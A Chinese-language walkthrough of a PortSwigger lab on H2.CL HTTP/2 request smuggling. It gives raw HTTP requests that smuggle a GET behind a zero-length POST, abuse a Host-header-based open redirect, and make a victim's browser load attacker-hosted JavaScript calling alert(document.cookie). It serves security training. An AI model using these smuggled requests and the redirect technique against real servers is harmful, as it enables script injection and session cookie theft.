# 实验：H2.CL 请求走私

本实验容易受到请求走私的攻击，因为前端服务器会对 HTTP/2 请求进行降级，即使它们具有歧义长度。

要解决本实验，执行一次请求走私攻击，导致受害者的浏览器从 exploit server 加载并执行一个恶意 JavaScript 文件，调用 `alert(document.cookie)`。受害用户每 10 秒访问一次首页。

> **提示**
>
> - 解决本实验需要我们在之前的 [HTTP 请求走私材料] 中涵盖的技术。
> - 您需要在受害者的浏览器尝试导入 JavaScript 资源之前立即投毒连接。否则，它会从 exploit server 获取您的载荷，但不会执行它。您可能需要重复攻击几次才能把握好时机。

## 步骤

探测
- 访问首页
    ```http
    GET / HTTP/2
    Host: 0a30001604ae8bba8166250e00920034.web-security-academy.net
    ```


发送到重复器，在查看器面板中选择“请求头部”栏，此处可修改 HTTP/2 的各种（伪）头部
- 尝试在攻击请求中设置 HTTP/2 的 CL 头部

    ```http
    POST / HTTP/2
    Host: 0a30001604ae8bba8166250e00920034.web-security-academy.net
    Content-Length: 0

    GET /404 HTTP/1.1
    Host: 0a30001604ae8bba8166250e00920034.web-security-academy.net
    Content-Length: 4

    x=1
    ```

- 普通请求的服务器响应

    ```http
    HTTP/2 404 Not Found

    "Not Found"
    ```

- 确认 H2-CL 请求走私漏洞

尝试走私外部端点的 JS 资源以覆盖应用程序的 JS 请求
- 使用开放重定向或其他漏洞
- 探测
    - 页面加载分析用 JS 脚本
        ```html
        <script type="text/javascript" src="/resources/js/analyticsFetcher.js">
        </script>
        ```

    - `/resources/js/analyticsFetcher.js`

        ```js
        setTimeout(() => {
            const script = document.createElement('script');
            document.body.appendChild(script);
            uid = Math.random().toString(10).substr(2, 10);
            script.src = '/resources/js/analytics.js?uid=' + uid;
        }, 5000);
        ```
        - 定时加载随机 uid 的分析脚本

    - `/resources/js/analytics.js?uid=2963058210`

        ```js
        function randomString(length, chars) {
            var result = '';
            for (var i = length; i > 0;
                --i) result += chars[Math.floor(Math.random() * chars.length)];
            return result;
        }
        var id = randomString(16, '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ');
        fetch('/analytics?id=' + id)
        ```
        - 向分析端点发送作为请求参数的随机 id

    - 似乎没有有趣的内容，尝试访问资源端点寻找开放重定向 

- 逐步删除 URL 
    ```http
    GET /resources/js/analytics HTTP/2
    Host: 0a30001604ae8bba8166250e00920034.web-security-academy.net
    ```

    - 服务器返回重定向
        ```http
        HTTP/2 302 Found
        Location: https://0a30001604ae8bba8166250e00920034.web-security-academy.net/resources/js/analytics/
        ```

- 尝试探测重定向
    ```http
    Host: 0a30001604ae8bba8166250e00920034.web-security-academy.net:80
    ```

    - 服务器返回
        ```http
        Location: https://0a30001604ae8bba8166250e00920034.web-security-academy.net:80/resources/js/analytics/
        ```
    
    - 使用 HOST 头部动态构建重定向 URL


- 尝试设置外部攻击者端点到重定向
    - 攻击者端点设置为重定向固定路径
        `/resources/js/analytics/`
    
    - 页面内容设置
        ```js
        alert(document.cookie)
        ```
    - 攻击请求
        ```http
        POST / HTTP/2
        Host: 0a30001604ae8bba8166250e00920034.web-security-academy.net
        Content-Length: 0

        GET /resources/js/analytics HTTP/1.1
        Host: exploit-0aba00ce04df8b41818a2453014a0011.exploit-server.net
        Content-Length: 4

        x=1
        ```
        - 走私请求的端点为开放重定向端点，一旦恰巧命中 JS 脚本加载，则服务器端重定向到攻击者端点加载 JS

- 普通请求测试开放重定向，服务器响应
    ```http
    HTTP/2 302 Found
    Location: https://exploit-0aba00ce04df8b41818a2453014a0011.exploit-server.net/resources/js/analytics/
    ```
    - 开放重定向端点设置成功

- 重复几次攻击请求，通过挑战
